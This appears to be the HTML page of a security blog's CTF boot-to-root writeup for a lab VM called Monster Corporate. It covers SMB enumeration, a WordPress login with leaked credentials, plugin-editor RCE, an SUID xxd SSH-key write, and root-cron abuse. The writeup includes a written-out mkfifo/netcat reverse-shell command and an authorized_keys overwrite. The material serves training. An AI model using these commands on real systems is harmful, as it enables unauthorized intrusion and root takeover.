@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>B2R Monster Corporate Writeup | zx10r Security Notes</title>
+<meta name="keywords" content="ctf, web, wordpress, smb, privilege-escalation">
+<meta name="description" content="A boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement with xxd, and cron-based privilege escalation.">
+<meta name="author" content="zx10r">
+<link rel="canonical" href="https://portfolio.aimansam.my/blog/posts/monster-corporate/">
+<link crossorigin="anonymous" href="/blog/assets/css/stylesheet.2f55ee07ef73baa213e875e5fb87df2c4d5021461d64e6794d82b133ad6e79ce.css" integrity="sha256-L1XuB&#43;9zuqIT6HXl&#43;4ffLE1QIUYdZOZ5TYKxM61uec4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://portfolio.aimansam.my/blog/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://portfolio.aimansam.my/blog/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://portfolio.aimansam.my/blog/favicon.svg">
+<link rel="apple-touch-icon" href="https://portfolio.aimansam.my/blog/favicon.svg">
+<link rel="mask-icon" href="https://portfolio.aimansam.my/blog/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://portfolio.aimansam.my/blog/posts/monster-corporate/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://portfolio.aimansam.my/blog/posts/monster-corporate/">
+  <meta property="og:site_name" content="zx10r Security Notes">
+  <meta property="og:title" content="B2R Monster Corporate Writeup">
+  <meta property="og:description" content="A boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement with xxd, and cron-based privilege escalation.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-11T00:00:00+08:00">
+    <meta property="article:modified_time" content="2026-05-11T00:00:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Wordpress">
+    <meta property="article:tag" content="Smb">
+    <meta property="article:tag" content="Privilege Escalation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="B2R Monster Corporate Writeup">
+  <meta name="twitter:description" content="A boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement with xxd, and cron-based privilege escalation.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://portfolio.aimansam.my/blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "B2R Monster Corporate Writeup",
+      "item": "https://portfolio.aimansam.my/blog/posts/monster-corporate/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "B2R Monster Corporate Writeup",
+  "name": "B2R Monster Corporate Writeup",
+  "description": "A boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement with xxd, and cron-based privilege escalation.",
+  "keywords": [
+    "ctf", "web", "wordpress", "smb", "privilege-escalation"
+  ],
+  "articleBody": "Challenge description Full attack chain summary Initial foothold Find WordPress admin credentials in an SMB share, log in to wp-admin, use plugin editing for RCE, and gain a shell as www-data.\nLateral movement Find an active SUID bit on xxd, write an SSH key for boboyot, and log in as that user.\nPrivilege escalation Find a root cron job running a backup script, confirm boboyot can write to that script, and use it to gain a root shell.\nVM setup Open the VM artifact in VMware (preferred) or VirtualBox. Make sure the attack box and target machine both use a host-only network. Power on the target machine. Start hacking from your Kali machine. Identify your attack-box IP and target IP Run ifconfig to identify the attack-box interface.\nifconfig br-027bd027cace: flags=4099 mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255 ether 02:42:cd:7b:07:03 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:c7:14:f0:c0 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 2 overruns 0 carrier 0 collisions 0 eth0: flags=4163 mtu 1500 inet 192.168.106.128 netmask 255.255.255.0 broadcast 192.168.106.255 inet6 fe80::4b6e:3699:9616:da69 prefixlen 64 scopeid 0x20 ether 00:0c:29:8c:03:70 txqueuelen 1000 (Ethernet) RX packets 152 bytes 11602 (11.3 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 555 bytes 34810 (33.9 KiB) TX errors 0 dropped 1 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 44 bytes 2796 (2.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 44 bytes 2796 (2.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Attack-box IP (eth0): 192.168.106.128\nTo identify the target machine IP, run a host discovery scan.\nnmap 192.168.106.0/24 -sn Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 23:54 -0400 Nmap scan report for 192.168.106.1 Host is up (0.00042s latency). MAC Address: 00:50:56:C0:00:01 (VMware) Nmap scan report for 192.168.106.129 Host is up (0.00057s latency). MAC Address: 00:0C:29:25:F6:2F (VMware) Nmap scan report for 192.168.106.254 Host is up (0.00022s latency). MAC Address: 00:50:56:E4:DC:88 (VMware) Nmap scan report for 192.168.106.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 12.43 seconds Target machine IP: 192.168.106.129\nService discovery Run an initial Nmap scan to discover open ports on the target IP.\nnmap 192.168.106.129 -sV -oN initial.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 10.0p2 Ubuntu 5ubuntu5 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.64 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 4 445/tcp open netbios-ssn Samba smbd 4 We discover four open ports: 22, 80, 139, and 445.\nContinue with default scripts to gather more service information.\nnmap 192.168.106.129 -sV -sC -oN second.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 10.0p2 Ubuntu 5ubuntu5 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.64 ((Ubuntu)) |_http-generator: WordPress 6.9.1 |_http-server-header: Apache/2.4.64 (Ubuntu) |_http-title: Monster 139/tcp open netbios-ssn Samba smbd 4 445/tcp open netbios-ssn Samba smbd 4 MAC Address: 00:0C:29:25:F6:2F (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -1h27m26s | smb2-time: | date: 2026-03-11T02:39:13 |_ start_date: N/A |_nbstat: NetBIOS name: MONSTER, NetBIOS user: , NetBIOS MAC: (unknown) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required From the scan, we can conclude that the Linux target is running SSH, HTTP, and SMB. The website is using WordPress.\nSMB is a good place to start because shared folders often contain useful information.\nEnumerating SMB We can list SMB shares if the service accepts guest login.\nsmbclient -L //192.168.106.129 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers publicshare Disk IPC$ IPC IPC Service (monster server (Samba, Ubuntu)) The server accepts guest login.\nWe find publicshare, which is not a default share.\nTry connecting to publicshare:\nsmbclient //192.168.106.129/publicshare -N Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Thu Mar 5 10:42:02 2026 .. D 0 Thu Mar 5 10:42:02 2026 note.txt N 98 Thu Mar 5 10:40:59 2026 Use ls to list files in the share.\nThe share contains note.txt. Download and read it.\nsmb: \\\u003e get note.txt getting file \\note.txt of size 98 as note.txt (13.7 KiloBytes/sec) (average 13.7 KiloBytes/sec) smb: \\\u003e quit cat note.txt Dear gempa, Here is your default password \"KUasa#lemt4l\". Please change it later. From: boboyot We found credentials in SMB, but we still need to find where to use them.\nNext, enumerate the web service.\nEnumerating website Open the website in a browser.\nJust a normal blog, nothing interesting here.\nSince we know the website is using WordPress, we can directly access wp-login.php.\nIf you do not know the endpoint, fuzz the site with a tool such as dirsearch.\ndirsearch -u http://192.168.106.129 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/Desktop/ctf/26-divideCTF/reports/http_192.168.106.129/_26-03-11_00-31-43.txt Target: http://192.168.106.129/ [00:31:44] Starting: [00:31:45] 403 - 280B - /.ht_wsr.txt [00:31:45] 403 - 280B - /.htaccess.bak1 [00:31:45] 403 - 280B - /.htaccess.sample [00:31:45] 403 - 280B - /.htaccess.save [00:31:45] 403 - 280B - /.htaccess.orig [00:31:45] 403 - 280B - /.htaccess_orig [00:31:45] 403 - 280B - /.htaccess_sc [00:31:45] 403 - 280B - /.htaccess_extra [00:31:45] 403 - 280B - /.htaccessBAK [00:31:45] 403 - 280B - /.htaccessOLD [00:31:45] 403 - 280B - /.htaccessOLD2 [00:31:45] 403 - 280B - /.htm [00:31:45] 403 - 280B - /.html [00:31:45] 403 - 280B - /.htpasswd_test [00:31:45] 403 - 280B - /.htpasswds [00:31:45] 403 - 280B - /.httr-oauth [00:31:47] 403 - 280B - /.php [00:31:56] 301 - 0B - /index.php -\u003e http://192.168.106.129/ [00:31:56] 404 - 66KB - /index.php/login/ [00:31:57] 200 - 7KB - /license.txt [00:32:01] 200 - 3KB - /readme.html [00:32:02] 403 - 280B - /server-status [00:32:02] 403 - 280B - /server-status/ [00:32:06] 301 - 321B - /wp-admin -\u003e http://192.168.106.129/wp-admin/ [00:32:06] 400 - 1B - /wp-admin/admin-ajax.php [00:32:06] 302 - 0B - /wp-admin/ -\u003e http://192.168.106.129/wp-login.php?redirect_to=http%3A%2F%2F192.168.106.129%2Fwp-admin%2F\u0026reauth=1 [00:32:06] 409 - 3KB - /wp-admin/setup-config.php [00:32:06] 200 - 505B - /wp-admin/install.php [00:32:06] 200 - 0B - /wp-config.php [00:32:06] 301 - 323B - /wp-content -\u003e http://192.168.106.129/wp-content/ [00:32:06] 200 - 0B - /wp-content/ [00:32:06] 200 - 84B - /wp-content/plugins/akismet/akismet.php [00:32:06] 200 - 0B - /wp-content/plugins/hello.php [00:32:06] 200 - 458B - /wp-content/uploads/ [00:32:07] 301 - 324B - /wp-includes -\u003e http://192.168.106.129/wp-includes/ [00:32:07] 200 - 0B - /wp-includes/rss-functions.php [00:32:07] 200 - 0B - /wp-cron.php [00:32:07] 200 - 4KB - /wp-includes/ [00:32:07] 200 - 2KB - /wp-login.php [00:32:07] 302 - 0B - /wp-signup.php -\u003e http://192.168.106.129/wp-login.php?action=register [00:32:07] 405 - 42B - /xmlrpc.php Go to wp-login.php and test the credentials found earlier.\nFrom the note.txt file found earlier:\nDear gempa, Here is your default password \"KUasa#lemt4l\". Please change it later. From: boboyot Log in with username gempa and password KUasa#lemt4l.\nGood news: the credentials work for wp-admin.\nNext, check what permissions the gempa user has.\nInitial foothold The gempa user is a WordPress administrator. To get the initial foothold, we can use plugin editing to achieve RCE.\nThere are two inactive plugins. I use Hello Dolly.\nActivate the plugin first.\nThen go to Tools, open Plugin File Editor, select Hello Dolly from the top-right dropdown, and click Select.\nThen use a PHP reverse shell payload to get a shell. I generated the payload with revshells.com.\nSet your attack-box IP address and port to listen.\nCopy the PHP code, paste it into the hello.php editor, and update the file.\nBefore executing the shell, set up a listener on the port used in the payload.\nI use port 8888 with netcat.\nnc -lvnp 8888 listening on [any] 8888 ... The listener is ready. Now execute the payload.\nNavigate to http://192.168.106.129/wp-content/plugins/hello.php to trigger the shell.\nIf you are unsure where this path came from, check the dirsearch result from earlier.\nIf the browser request hangs, check your listener.\nThe listener receives a reverse shell.\nnc -lvnp 8888 listening on [any] 8888 ... connect to [192.168.106.128] from (UNKNOWN) [192.168.106.129] 33024 Linux monster 6.17.0-14-generic #14-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 9 17:01:16 UTC 2026 x86_64 GNU/Linux 15:20:39 up 28 min, 0 users, load average: 0.15, 0.17, 0.14 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1902): Inappropriate ioctl for device bash: no job control in this shell www-data@monster:/$ whoami whoami www-data www-data@monster:/$ We now have a shell as www-data.\nLateral movement Usually, www-data does not have enough privileges, so we need to escalate.\nFor post-exploitation enumeration, you can use LinPEAS, but I will show the manual path first.\nAfter entering the system, gather as much useful information as possible.\nBasic checklist:\nanother system user sudo -l SUID cronjob any misconfigured binary Find other users on the system.\ncat /etc/passwd root:x:0:0:root:/root:/bin/bash ... boboyot:x:1000:1000:boboyot:/home/boboyot:/bin/bash ... Look for users with a shell, or list the /home directory.\nls -la /home total 12 drwxr-xr-x 3 root root 4096 Mar 5 11:01 . drwxr-xr-x 20 root root 4096 Mar 6 00:54 .. drwxr-x--- 15 boboyot boboyot 4096 Mar 5 14:53 boboyot Check sudo permissions with sudo -l.\nsudo -l sudo-rs: Sorry, user www-data may not run sudo on monster. www-data has no sudo privileges.\nFind active SUID binaries.\nfind / -type f -perm -04000 -ls 2\u003e/dev/null ... 27896 8 -rwsr-sr-x 1 boboyot boboyot 7180 Nov 26 2024 /usr/lib/nagios/plugins/check_log ... 1145 24 -rwsr-sr-x 1 boboyot boboyot 22896 Sep 15 16:38 /usr/bin/xxd We find an interesting SUID binary.\nThe result shows an active SUID bit on xxd, which is a useful escalation vector.\nOpen GTFOBins to find useful commands for this binary.\nWith this path, we can read and write as boboyot, but it does not directly give us a shell.\nRemember from the port scan that SSH is open. We can write an SSH key and log in as boboyot.\nTo write an SSH public key, adapt the command from GTFOBins.\nGenerate an SSH key pair on the attack box.\nssh-keygen -t ED25519 -f boboyot Generating public/private ED25519 key pair. Enter passphrase for \"boboyot\" (empty for no passphrase): Enter same passphrase again: Your identification has been saved in boboyot Your public key has been saved in boboyot.pub The key fingerprint is: SHA256:SmptK1/jJTCWZjp5tLhQci2ccDFGoHHMp3nDMM3N8O8 kali@kali The key's randomart image is: +--[ED25519 256]--+ |.oo=*+ | | +=.++o | |. .B. . | | o++o o | | ..*.@ S | | + \u0026 * | | . B * E . | | o.= + + | | .oo . | +----[SHA256]-----+ Copy the generated public key.\ncat boboyot.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD kali@kali On the target machine, use xxd to write the public key into authorized_keys.\nCustomize the command to write the SSH public key to /home/boboyot/.ssh/authorized_keys.\necho \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD kali@kali\\n\" | xxd | xxd -r - /home/boboyot/.ssh/authorized_keys Run the command on the target machine.\nAfter the overwrite succeeds, SSH as boboyot.\nReturn to the attack machine and log in with the private key.\nssh boboyot@192.168.106.129 -i boboyot Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-14-generic x86_64) * Documentation: https://docs.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed Mar 11 16:17:16 UTC 2026 System load: 0.58 Memory usage: 51% Processes: 305 Usage of /: 41.8% of 17.83GB Swap usage: 0% Users logged in: 0 * Due to a now-resolved bug in the date command, this system may be unable to automatically check for updates. Manually install the update using: sudo apt install --update rust-coreutils https://discourse.ubuntu.com/t/enabling-updates-on-ubuntu-25-10-systems/ 0 updates can be applied immediately. boboyot@monster:~$ We now have a shell as boboyot.\nPrivilege escalation to root Continue with the post-exploitation checklist:\nanother system user sudo -l SUID cronjob any misconfigured binary There are still a few items to check.\nStart with sudo -l.\nsudo -l sudo-rs: Sorry, user boboyot may not run sudo on monster. boboyot does not have sudo permissions.\nProceed to check cron jobs.\ncat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh # You can also override PATH, but by default, newer versions inherit it from the environment #PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || { cd / \u0026\u0026 run-parts --report /etc/cron.daily; } 47 6 * * 7 root test -x /usr/sbin/anacron || { cd / \u0026\u0026 run-parts --report /etc/cron.weekly; } 52 6 1 * * root test -x /usr/sbin/anacron || { cd / \u0026\u0026 run-parts --report /etc/cron.monthly; } # * * * * * root /opt/backup.sh We find a root cron job.\nAnalyze /opt/backup.sh.\nls -la /opt/backup.sh -rwxrw---- 1 root boboyot 95 Mar 6 01:03 /opt/backup.sh cat /opt/backup.sh rm /opt/backup/*.tar.gz;tar -czf /opt/backup/boboyot_home_$(date +%Y%m%d).tar.gz /home/boboyot This is a normal backup script for the boboyot home directory.\nFrom the file permissions, the boboyot group can write to /opt/backup.sh.\nThat means we can modify the script and use the root cron job to spawn a root shell.\nThere are several ways to spawn a root shell.\nI prefer using a reverse shell because the script runs every minute.\nThis gives us a reliable way to catch the root shell from the attack box.\nGenerate another payload with revshells.com.\nI use the nc mkfifo reverse shell payload on port 9999.\nOverwrite /opt/backup.sh with the payload.\necho 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u003e\u00261|nc 192.168.106.128 9999 \u003e/tmp/f' \u003e /opt/backup.sh Set up the listener.\nnc -lvnp 9999 listening on [any] 9999 ... Wait for the backup script to execute.\nnc -lvnp 9999 listening on [any] 9999 ... connect to [192.168.106.128] from (UNKNOWN) [192.168.106.129] 49754 bash: cannot set terminal process group (5447): Inappropriate ioctl for device bash: no job control in this shell root@monster:~# We now have a root shell.\nClaim your flag in the Discord ticket. Bye bye.\nThank you for reading.\nAUTHOR: 𝓚𝓘𝓝𝓖\n",
+  "wordCount" : "2442",
+  "inLanguage": "en",
+  "datePublished": "2026-05-11T00:00:00+08:00",
+  "dateModified": "2026-05-11T00:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "zx10r"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://portfolio.aimansam.my/blog/posts/monster-corporate/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zx10r Security Notes",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://portfolio.aimansam.my/blog/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://portfolio.aimansam.my/blog/" accesskey="h" title="zx10r Security Notes (Alt + H)">zx10r Security Notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://portfolio.aimansam.my/" title="Portfolio">
+                    <span>Portfolio</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/start-here/" title="Start Here">
+                    <span>Start Here</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://portfolio.aimansam.my/blog/index.xml" title="RSS">
+                    <span>RSS</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/blog/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      B2R Monster Corporate Writeup
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-05-11 00:00:00 +0800 +08'>May 11, 2026</span>&nbsp;·&nbsp;<span>12 min</span>&nbsp;·&nbsp;<span>zx10r</span>
+
+</div>
+  </header> <details class="toc"  open>
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#challenge-description" aria-label="Challenge description">Challenge description</a></li>
+            <li>
+                <a href="#full-attack-chain-summary" aria-label="Full attack chain summary">Full attack chain summary</a><ul>
+                    
+            <li>
+                <a href="#initial-foothold" aria-label="Initial foothold">Initial foothold</a></li>
+            <li>
+                <a href="#lateral-movement" aria-label="Lateral movement">Lateral movement</a></li>
+            <li>
+                <a href="#privilege-escalation" aria-label="Privilege escalation">Privilege escalation</a></li></ul>
+            </li>
+            <li>
+                <a href="#vm-setup" aria-label="VM setup">VM setup</a><ul>
+                    
+            <li>
+                <a href="#identify-your-attack-box-ip-and-target-ip" aria-label="Identify your attack-box IP and target IP">Identify your attack-box IP and target IP</a></li></ul>
+            </li>
+            <li>
+                <a href="#service-discovery" aria-label="Service discovery">Service discovery</a><ul>
+                    
+            <li>
+                <a href="#enumerating-smb" aria-label="Enumerating SMB">Enumerating SMB</a></li>
+            <li>
+                <a href="#enumerating-website" aria-label="Enumerating website">Enumerating website</a></li></ul>
+            </li>
+            <li>
+                <a href="#initial-foothold-1" aria-label="Initial foothold">Initial foothold</a></li>
+            <li>
+                <a href="#lateral-movement-1" aria-label="Lateral movement">Lateral movement</a></li>
+            <li>
+                <a href="#privilege-escalation-to-root" aria-label="Privilege escalation to root">Privilege escalation to root</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><h2 id="challenge-description">Challenge description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
+<p><img alt="Monster Corporate challenge description" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-00.png"></p>
+<h2 id="full-attack-chain-summary">Full attack chain summary<a hidden class="anchor" aria-hidden="true" href="#full-attack-chain-summary">#</a></h2>
+<h3 id="initial-foothold">Initial foothold<a hidden class="anchor" aria-hidden="true" href="#initial-foothold">#</a></h3>
+<p>Find WordPress admin credentials in an SMB share, log in to wp-admin, use plugin editing for RCE, and gain a shell as <code>www-data</code>.</p>
+<h3 id="lateral-movement">Lateral movement<a hidden class="anchor" aria-hidden="true" href="#lateral-movement">#</a></h3>
+<p>Find an active SUID bit on <code>xxd</code>, write an SSH key for <code>boboyot</code>, and log in as that user.</p>
+<h3 id="privilege-escalation">Privilege escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h3>
+<p>Find a root cron job running a backup script, confirm <code>boboyot</code> can write to that script, and use it to gain a root shell.</p>
+<h2 id="vm-setup">VM setup<a hidden class="anchor" aria-hidden="true" href="#vm-setup">#</a></h2>
+<ol>
+<li>Open the VM artifact in VMware (preferred) or VirtualBox.</li>
+<li>Make sure the attack box and target machine both use a host-only network.</li>
+</ol>
+<p><img alt="Virtual machine network settings" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-01.png"></p>
+<ol>
+<li>Power on the target machine.</li>
+<li>Start hacking from your Kali machine.</li>
+</ol>
+<h3 id="identify-your-attack-box-ip-and-target-ip">Identify your attack-box IP and target IP<a hidden class="anchor" aria-hidden="true" href="#identify-your-attack-box-ip-and-target-ip">#</a></h3>
+<p>Run <code>ifconfig</code> to identify the attack-box interface.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ifconfig
+</span></span><span style="display:flex;"><span>br-027bd027cace: flags<span style="color:#f92672">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+</span></span><span style="display:flex;"><span>        ether 02:42:cd:7b:07:03  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
